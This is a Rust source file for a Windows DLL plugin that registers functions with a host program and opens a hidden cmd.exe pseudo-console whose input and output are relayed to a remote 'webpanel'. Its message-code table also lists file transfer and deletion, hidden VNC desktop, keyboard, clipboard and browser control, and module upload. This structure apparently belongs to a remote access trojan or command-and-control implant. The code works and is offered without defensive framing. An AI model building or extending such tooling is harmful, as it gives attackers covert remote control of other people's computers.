use std::collections::HashMap;
use std::iter;
use std::ptr;
use std::slice;
use std::sync::Mutex;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE, TRUE};
use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
use windows_sys::Win32::System::Console::{
    ClosePseudoConsole, CreatePseudoConsole, ResizePseudoConsole, COORD, HPCON,
};
use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, VirtualAlloc};
use windows_sys::Win32::System::Pipes::{CreatePipe, PeekNamedPipe};

use windows_sys::Win32::System::Threading::{
    CreateProcessW, DeleteProcThreadAttributeList, GetExitCodeProcess, InitializeProcThreadAttributeList,
    TerminateProcess, UpdateProcThreadAttribute, CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT,
    PROCESS_INFORMATION, PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, STARTUPINFOEXW,
    STARTF_USESHOWWINDOW, WaitForSingleObject,
};
use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
use windows_sys::Win32::Storage::FileSystem::{ReadFile, WriteFile};

/// Represents a terminal session with its associated handles
struct TerminalSession {
    pty_handle: HPCON,
    process_handle: HANDLE,
    thread_handle: HANDLE,
    stdin_write: HANDLE,
    stdout_read: HANDLE,
}

// SAFETY: The handles are only accessed through proper synchronization via the Mutex.
// The raw pointers (HANDLE) are thread-safe as Windows handles can be used across threads.
unsafe impl Send for TerminalSession {}

impl Drop for TerminalSession {
    fn drop(&mut self) {
        unsafe {
            if self.pty_handle != 0 {
                ClosePseudoConsole(self.pty_handle);
            }
            if self.stdin_write != INVALID_HANDLE_VALUE && !self.stdin_write.is_null() {
                CloseHandle(self.stdin_write);
            }
            if self.stdout_read != INVALID_HANDLE_VALUE && !self.stdout_read.is_null() {
                CloseHandle(self.stdout_read);
            }
            if self.process_handle != INVALID_HANDLE_VALUE && !self.process_handle.is_null() {
                TerminateProcess(self.process_handle, 0);
                CloseHandle(self.process_handle);
            }
            if self.thread_handle != INVALID_HANDLE_VALUE && !self.thread_handle.is_null() {
                CloseHandle(self.thread_handle);
            }
        }
    }
}

/// Global storage for terminal sessions, keyed by label
static TERMINAL_SESSIONS: Mutex<Option<HashMap<u32, TerminalSession>>> = Mutex::new(None);

fn get_sessions() -> std::sync::MutexGuard<'static, Option<HashMap<u32, TerminalSession>>> {
    let mut guard = TERMINAL_SESSIONS.lock().unwrap();
    if guard.is_none() {
        *guard = Some(HashMap::new());
    }
    guard
}



#[repr(u16)]
pub enum MESSAGE_CODE {
    KEEP_ALIVE = 0,
	COLLECT_META = 1,

	MODULE_LIST     = 2,
	MODULE_LOAD     = 2<<8 | 1,
	MODULE_UNLOAD   = 2<<8 | 2,
	MODULE_UPLOAD = 2<<8 | 3,
    MODULE_COMMAND  = 2<<8 | 4,
	
    FILE_COPY     = 3,
	FILE_MOVE     = 3<<8 | 1,
	FILE_DELETE   = 3<<8 | 2,
	FILE_UPLOAD   = 3<<8 | 3,
	FILE_DOWNLOAD = 3<<8 | 4,
	
    DIRECTORY_PRINT  = 4,
	DIRECTORY_CHANGE = 4<<8 | 1,
	DIRECTORY_CREATE = 4<<8 | 2,
	DIRECTORY_COPY   = 4<<8 | 3,
	DIRECTORY_MOVE   = 4<<8 | 4,
	DIRECTORY_LIST   = 4<<8 | 5,
	DIRECTORY_DELETE = 4<<8 | 6,

    DRIVE_LIST = 5<<8 | 5,

    VNC                   = 6,
    VNC_RGBA_DATA         = 6<<8 | 1,
    VNC_JPEG_DATA         = 6<<8 | 2,
    VNC_MOUSE_BUTTON      = 6<<8 | 3,
    VNC_MOUSE_MOVE        = 6<<8 | 4,
    VNC_SEND_KEY          = 6<<8 | 5,
    VNC_GET_WINDOWS       = 6<<8 | 6,
    VNC_SET_WINDOW        = 6<<8 | 7,
    VNC_GET_DESKTOP       = 6<<8 | 8,
    VNC_SET_DESKTOP       = 6<<8 | 9,
    VNC_GET_CLIPBOARD     = 6<<8 | 10,
    VNC_SET_CLIPBOARD     = 6<<8 | 11,
    VNC_GET_BROWSERS      = 6<<8 | 12,
    VNC_LAUNCH_BROWSER    = 6<<8 | 14,
    VNC_RESIZE_WINDOW     = 6<<8 | 15,
    VNC_REQUEST_FB_UPDATE = 6<<8 | 16,

    TERMINAL = 7,

    TERMINAL_STDIN = 7<<8 | 1,
    TERMINAL_STDOUT = 7<<8 | 2,
    TERMINAL_SIGNAL = 7<<8 | 3,
    TERMINAL_LAUNCH = 7<<8 | 4,
}

struct proc {
    flags: u8,
    message_code:u16,
    address: usize,
    name_len:u32,
    name:[u16;16],
}

#[unsafe(no_mangle)]
pub unsafe fn register(_internal_proc_list_ptr:*const usize, _internal_proc_list_len:*const usize,module_proc_list_ptr:*mut usize,module_proc_list_len:*mut usize) -> i32 {
    //return this modules available functions + meta data.
    let mut proc_list:Vec<proc> = Vec::new();

    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::TERMINAL_STDIN as u16, address: stdin as usize, name_len: 0, name: [0;16] });
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::TERMINAL_STDOUT as u16, address: stdout as usize, name_len: 0, name: [0;16] });
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::TERMINAL_SIGNAL as u16, address: signal_terminal as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: MESSAGE_CODE::TERMINAL_LAUNCH as u16, address: launch as usize, name_len:0, name:[0;16]});
    proc_list.push(proc { flags: 0, message_code: 0, address: 0, name_len: 0, name: [0;16] });

    let out_proc_list_len = size_of::<proc>()*proc_list.len();
    
    unsafe {
        *module_proc_list_len = out_proc_list_len;

        let out_proc_list = VirtualAlloc(std::ptr::null(), out_proc_list_len, MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
        std::ptr::copy_nonoverlapping(proc_list.as_ptr() as *const _, out_proc_list, out_proc_list_len);
        std::ptr::write(module_proc_list_ptr, out_proc_list as usize);
    }
    0
}


#[unsafe(no_mangle)]
pub unsafe fn stdin(_flags: *mut u16, label: u32, input: *const usize, input_size: usize, _out: *mut usize, _out_size: *mut usize) -> i32 {
    // Takes input from the webpanel and writes to the terminal's stdin
    println!("[TTY] stdin called: label={}, input_size={}", label, input_size);
    
    if input_size == 0 {
        println!("[TTY] stdin: no input data");
        return 0;
    }

    let sessions = get_sessions();
    let session = match sessions.as_ref().and_then(|s| s.get(&label)) {
        Some(s) => s,
        None => {
            #[cfg(debug_assertions)]
            println!("[TTY] stdin: session {} not found", label);
            return -1; // Session not found
        }
    };

    unsafe {
        let data = slice::from_raw_parts(input as *const u8, input_size);
        
        // Always print for debugging
        println!("[TTY] stdin: writing {} bytes to pipe", data.len());
        println!("[TTY] stdin: raw bytes: {:02X?}", &data[..std::cmp::min(data.len(), 64)]);
        println!("[TTY] stdin: as string: {:?}", String::from_utf8_lossy(data));
        
        let mut bytes_written: u32 = 0;

        let result = WriteFile(
            session.stdin_write,
            data.as_ptr(),
            data.len() as u32,
            &mut bytes_written,
            ptr::null_mut(),
        );

        if result == 0 {
            let err = GetLastError();
            println!("[TTY] stdin: WriteFile failed with error {}", err);
            return -2; // Write failed
        }
        
        println!("[TTY] stdin: wrote {} bytes successfully", bytes_written);
    }

    0
}

// Track poll count for less verbose logging
static STDOUT_POLL_COUNT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);

#[unsafe(no_mangle)]
pub unsafe fn stdout(_flags: *mut u16, label: u32, _input: *const usize, _input_size: usize, out: *mut usize, out_size: *mut usize) -> i32 {
    // Reads output from the terminal and returns it to the webpanel
    let poll_count = STDOUT_POLL_COUNT.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
    
    // Print first 20 polls, then every 100th to debug initial connection
    if poll_count < 20 || poll_count % 100 == 0 {
        println!("[TTY] stdout: poll #{}, label={}", poll_count, label);
    }

    let sessions = get_sessions();
    let session = match sessions.as_ref().and_then(|s| s.get(&label)) {
        Some(s) => s,
        None => {
            println!("[TTY] stdout: session {} not found (poll #{})", label, poll_count);
            unsafe { *out_size = 0; }
            return -1; // Session not found
        }
    };

    if poll_count < 20 || poll_count % 100 == 0 {
        println!("[TTY] stdout: session found, stdout_read handle={:?}", session.stdout_read);
    }

    unsafe {
        // First, check if there's data available using PeekNamedPipe (non-blocking)
        let mut bytes_available: u32 = 0;
        let mut total_bytes_avail: u32 = 0;
        let mut bytes_left: u32 = 0;
        let peek_result = PeekNamedPipe(
            session.stdout_read,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
            &mut total_bytes_avail,
            &mut bytes_left,
        );

        if peek_result == 0 {
            let err = GetLastError();
            println!("[TTY] stdout: PeekNamedPipe failed with error {} (poll #{})", err, poll_count);
            *out_size = 0;
            return 0;
        }

        // If no data available, return immediately (non-blocking)
        if total_bytes_avail == 0 {
            if poll_count < 20 {
                println!("[TTY] stdout: no data available yet (poll #{})", poll_count);
            }
            *out_size = 0;
            return 0;
        }

        // ALWAYS print when data is available
        println!("[TTY] stdout: *** {} bytes available in pipe! *** (poll #{})", total_bytes_avail, poll_count);

        // Allocate buffer for the available data
        let read_size = std::cmp::min(total_bytes_avail as usize, 65536);
        let buffer = VirtualAlloc(
            ptr::null(),
            read_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        ) as *mut u8;

        if buffer.is_null() {
            #[cfg(debug_assertions)]
            println!("[TTY] stdout: VirtualAlloc failed");
            *out_size = 0;
            return -2; // Allocation failed
        }

        let mut bytes_read: u32 = 0;

        let result = ReadFile(
            session.stdout_read,
            buffer,
            read_size as u32,
            &mut bytes_read,
            ptr::null_mut(),
        );

        if result == 0 || bytes_read == 0 {
            let err = GetLastError();
            #[cfg(debug_assertions)]
            println!("[TTY] stdout: ReadFile failed with error {}, bytes_read={}", err, bytes_read);
            // Read failed - free buffer and return
            windows_sys::Win32::System::Memory::VirtualFree(
                buffer as *mut _,
                0,
                windows_sys::Win32::System::Memory::MEM_RELEASE,
            );
            *out_size = 0;
            return 0;
        }

        // Always print for debugging
        {
            let read_data = slice::from_raw_parts(buffer, bytes_read as usize);
            println!("[TTY] stdout: *** READ {} bytes ***", bytes_read);
            println!("[TTY] stdout: raw bytes: {:02X?}", &read_data[..std::cmp::min(read_data.len(), 64)]);
            println!("[TTY] stdout: as string: {:?}", String::from_utf8_lossy(&read_data[..std::cmp::min(read_data.len(), 256)]));
        }

        // Return the raw bytes
        *out_size = bytes_read as usize;
        ptr::write(out, buffer as usize);
        
        println!("[TTY] stdout: returning {} bytes to caller, buffer={:?}", bytes_read, buffer);
    }

    0
}

#[unsafe(no_mangle)]
pub unsafe fn signal_terminal(_flags: *mut u16, label: u32, input: *const usize, input_size: usize, _out: *mut usize, _out_size: *mut usize) -> i32 {
    // Handle signals for the terminal session
    // Signal types:
    //   0 = Terminate session
    //   1 = Resize terminal (input contains: cols (u16) + rows (u16) = 4 bytes)

    #[cfg(debug_assertions)]
    println!("[TTY] signal called: label={}, input_size={}", label, input_size);

    if input_size < 1 {
        #[cfg(debug_assertions)]
        println!("[TTY] signal: invalid input size");
        return -1; // Invalid input
    }

    let signal_data = unsafe { slice::from_raw_parts(input as *const u8, input_size) };
    let signal_type = signal_data[0];

    #[cfg(debug_assertions)]
    println!("[TTY] signal: type={}", signal_type);

    match signal_type {
        0 => {
            // Terminate session
            #[cfg(debug_assertions)]
            println!("[TTY] signal: terminating session {}", label);
            let mut sessions = get_sessions();
            if let Some(sessions_map) = sessions.as_mut() {
                sessions_map.remove(&label);
            }
            0
        }
        1 => {
            // Resize terminal
            if input_size < 5 {
                #[cfg(debug_assertions)]
                println!("[TTY] signal: resize requires 5 bytes, got {}", input_size);
                return -2; // Need signal_type (1) + cols (2) + rows (2) = 5 bytes
            }

            let cols = u16::from_le_bytes([signal_data[1], signal_data[2]]);
            let rows = u16::from_le_bytes([signal_data[3], signal_data[4]]);

            #[cfg(debug_assertions)]
            println!("[TTY] signal: resize to {}x{}", cols, rows);

            let sessions = get_sessions();
            let session = match sessions.as_ref().and_then(|s| s.get(&label)) {
                Some(s) => s,
                None => {
                    #[cfg(debug_assertions)]
                    println!("[TTY] signal: session {} not found", label);
                    return -3; // Session not found
                }
            };

            let size = COORD { X: cols as i16, Y: rows as i16 };
            let result = unsafe { ResizePseudoConsole(session.pty_handle, size) };

            if result != 0 {
                #[cfg(debug_assertions)]
                println!("[TTY] signal: ResizePseudoConsole failed with result {}", result);
                return -4; // Resize failed
            }

            #[cfg(debug_assertions)]
            println!("[TTY] signal: resize successful");
            0
        }
        _ => {
            #[cfg(debug_assertions)]
            println!("[TTY] signal: unknown signal type {}", signal_type);
            -5 // Unknown signal type
        }
    }
}

#[unsafe(no_mangle)]
pub unsafe fn launch(_flags: *mut u16, label: u32, input: *const usize, input_size: usize, _out: *mut usize, _out_size: *mut usize) -> i32 {
    // Launches a shell with ConPTY using anonymous pipes
    // Following Microsoft's recommended ConPTY pattern
    
    println!("[TTY] launch called: label={}, input_size={}", label, input_size);

    // Default terminal size
    let mut cols: i16 = 80;
    let mut rows: i16 = 24;

    unsafe {
        // Parse input for size if provided
        if input_size >= 4 {
            let size_data = slice::from_raw_parts(input as *const u8, 4);
            cols = u16::from_le_bytes([size_data[0], size_data[1]]) as i16;
            rows = u16::from_le_bytes([size_data[2], size_data[3]]) as i16;
        }

        println!("[TTY] launch: terminal size {}x{}", cols, rows);

        // Create anonymous pipes
        // Pipe for stdin: pty_input_read (ConPTY reads) <-- pty_input_write (we write)
        // Pipe for stdout: pty_output_read (we read) <-- pty_output_write (ConPTY writes)
        
        let mut pty_input_read: HANDLE = INVALID_HANDLE_VALUE;
        let mut pty_input_write: HANDLE = INVALID_HANDLE_VALUE;
        let mut pty_output_read: HANDLE = INVALID_HANDLE_VALUE;
        let mut pty_output_write: HANDLE = INVALID_HANDLE_VALUE;

        // Security attributes - handles must be inheritable
        let mut sa = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: ptr::null_mut(),
            bInheritHandle: 1, // TRUE
        };

        // Create input pipe (we write to pty_input_write, ConPTY reads from pty_input_read)
        if CreatePipe(&mut pty_input_read, &mut pty_input_write, &mut sa, 0) == 0 {
            let err = GetLastError();
            println!("[TTY] launch: CreatePipe (input) failed with error {}", err);
            return -1;
        }
        println!("[TTY] launch: input pipe created: read={:?}, write={:?}", pty_input_read, pty_input_write);

        // Create output pipe (ConPTY writes to pty_output_write, we read from pty_output_read)
        if CreatePipe(&mut pty_output_read, &mut pty_output_write, &mut sa, 0) == 0 {
            let err = GetLastError();
            println!("[TTY] launch: CreatePipe (output) failed with error {}", err);
            CloseHandle(pty_input_read);
            CloseHandle(pty_input_write);
            return -2;
        }
        println!("[TTY] launch: output pipe created: read={:?}, write={:?}", pty_output_read, pty_output_write);

        // Create the pseudo console
        let console_size = COORD { X: cols, Y: rows };
        let mut pty_handle: HPCON = 0;

        println!("[TTY] launch: creating ConPTY...");
        println!("[TTY] launch:   ConPTY will read input from: {:?}", pty_input_read);
        println!("[TTY] launch:   ConPTY will write output to: {:?}", pty_output_write);
        
        let hr = CreatePseudoConsole(console_size, pty_input_read, pty_output_write, 0, &mut pty_handle);

        if hr != 0 {
            println!("[TTY] launch: CreatePseudoConsole failed with HRESULT 0x{:08X}", hr);
            CloseHandle(pty_input_read);
            CloseHandle(pty_input_write);
            CloseHandle(pty_output_read);
            CloseHandle(pty_output_write);
            return -3;
        }

        println!("[TTY] launch: pseudo console created: handle={}", pty_handle);

        // IMPORTANT: Close the pipe ends that ConPTY now owns
        // ConPTY duplicates these handles internally
        CloseHandle(pty_input_read);
        CloseHandle(pty_output_write);
        println!("[TTY] launch: closed ConPTY's pipe ends");

        // Now we have:
        // - pty_input_write: We write to this, ConPTY reads it
        // - pty_output_read: We read from this, ConPTY writes to it

        // Initialize the startup info with the pseudo console
        let mut startup_info: STARTUPINFOEXW = std::mem::zeroed();
        startup_info.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

        // Get the size needed for the attribute list
        let mut attr_list_size: usize = 0;
        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut attr_list_size);
        println!("[TTY] launch: attribute list size = {}", attr_list_size);

        // Allocate the attribute list
        let attr_list = VirtualAlloc(
            ptr::null(),
            attr_list_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if attr_list.is_null() {
            println!("[TTY] launch: VirtualAlloc for attribute list failed");
            ClosePseudoConsole(pty_handle);
            CloseHandle(pty_input_write);
            CloseHandle(pty_output_read);
            return -4;
        }

        startup_info.lpAttributeList = attr_list as *mut _;

        // Initialize the attribute list
        if InitializeProcThreadAttributeList(startup_info.lpAttributeList, 1, 0, &mut attr_list_size) == 0 {
            let err = GetLastError();
            println!("[TTY] launch: InitializeProcThreadAttributeList failed with error {}", err);
            windows_sys::Win32::System::Memory::VirtualFree(attr_list, 0, windows_sys::Win32::System::Memory::MEM_RELEASE);
            ClosePseudoConsole(pty_handle);
            CloseHandle(pty_input_write);
            CloseHandle(pty_output_read);
            return -5;
        }

        println!("[TTY] launch: attribute list initialized");

        // Add the pseudo console attribute
        // CRITICAL: Pass HPCON directly as PVOID (it IS a pointer), not a pointer to it
        if UpdateProcThreadAttribute(
            startup_info.lpAttributeList,
            0,
            PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE as usize,
            pty_handle as *mut _,  // HPCON is already pointer-sized, pass it directly
            std::mem::size_of::<HPCON>(),
            ptr::null_mut(),
            ptr::null_mut(),
        ) == 0 {
            let err = GetLastError();
            println!("[TTY] launch: UpdateProcThreadAttribute failed with error {}", err);
            DeleteProcThreadAttributeList(startup_info.lpAttributeList);
            windows_sys::Win32::System::Memory::VirtualFree(attr_list, 0, windows_sys::Win32::System::Memory::MEM_RELEASE);
            ClosePseudoConsole(pty_handle);
            CloseHandle(pty_input_write);
            CloseHandle(pty_output_read);
            return -6;
        }

        println!("[TTY] launch: pseudo console attribute added");

        // Prepare the command line
        let cmd_str = r"C:\Windows\System32\cmd.exe";
        let mut command_line: Vec<u16> = cmd_str.encode_utf16().chain(iter::once(0)).collect();
        println!("[TTY] launch: using command: {}", cmd_str);

        // If a custom command was provided after the size bytes
        if input_size > 4 {
            let cmd_data = slice::from_raw_parts((input as *const u8).add(4), input_size - 4);
            if cmd_data.len() >= 2 {
                let cmd_u16 = slice::from_raw_parts(cmd_data.as_ptr() as *const u16, cmd_data.len() / 2);
                command_line = cmd_u16.to_vec();
                if !command_line.is_empty() && command_line[command_line.len() - 1] != 0 {
                    command_line.push(0);
                }
            }
        }

        println!("[TTY] launch: command line ready, length={}", command_line.len());

        // Create the process
        let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

        let creation_flags = EXTENDED_STARTUPINFO_PRESENT;
        println!("[TTY] launch: creation flags = 0x{:08X}", creation_flags);

        let create_result = CreateProcessW(
            ptr::null(),
            command_line.as_mut_ptr(),
            ptr::null(),
            ptr::null(),
            0, // Don't inherit handles - ConPTY handles this
            creation_flags,
            ptr::null(),
            ptr::null(),
            &startup_info.StartupInfo,
            &mut process_info,
        );

        // Clean up the attribute list (no longer needed after CreateProcessW)
        DeleteProcThreadAttributeList(startup_info.lpAttributeList);
        windows_sys::Win32::System::Memory::VirtualFree(attr_list, 0, windows_sys::Win32::System::Memory::MEM_RELEASE);

        if create_result == 0 {
            let err = GetLastError();
            println!("[TTY] launch: CreateProcessW failed with error {}", err);
            ClosePseudoConsole(pty_handle);
            CloseHandle(pty_input_write);
            CloseHandle(pty_output_read);
            return -7;
        }

        println!("[TTY] launch: process created, PID={}, TID={}", process_info.dwProcessId, process_info.dwThreadId);
        
        // Wait briefly to see if process exits immediately
        let wait_result = WaitForSingleObject(process_info.hProcess, 500); // 500ms timeout
        
        if wait_result == 258 { // WAIT_TIMEOUT
            println!("[TTY] launch: process is still running after 500ms (good!)");
        } else {
            let mut exit_code: u32 = 0;
            GetExitCodeProcess(process_info.hProcess, &mut exit_code);
            println!("[TTY] launch: WARNING - process exited! wait_result={}, Exit code: {} (0x{:08X})", wait_result, exit_code, exit_code);
        }

        // Test: Try to read from stdout immediately
        println!("[TTY] launch: testing pipe read from {:?}...", pty_output_read);
        let mut test_available: u32 = 0;
        let peek_result = PeekNamedPipe(
            pty_output_read,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
            &mut test_available,
            ptr::null_mut(),
        );
        if peek_result == 0 {
            let err = GetLastError();
            println!("[TTY] launch: PeekNamedPipe test failed with error {}", err);
        } else {
            println!("[TTY] launch: PeekNamedPipe reports {} bytes available", test_available);
        }

        // Store the session
        let session = TerminalSession {
            pty_handle,
            process_handle: process_info.hProcess,
            thread_handle: process_info.hThread,
            stdin_write: pty_input_write,
            stdout_read: pty_output_read,
        };

        let mut sessions = get_sessions();
        if let Some(sessions_map) = sessions.as_mut() {
            sessions_map.insert(label, session);
            println!("[TTY] launch: session {} stored, total sessions={}", label, sessions_map.len());
        }
    }

    println!("[TTY] launch: completed successfully");
    0
}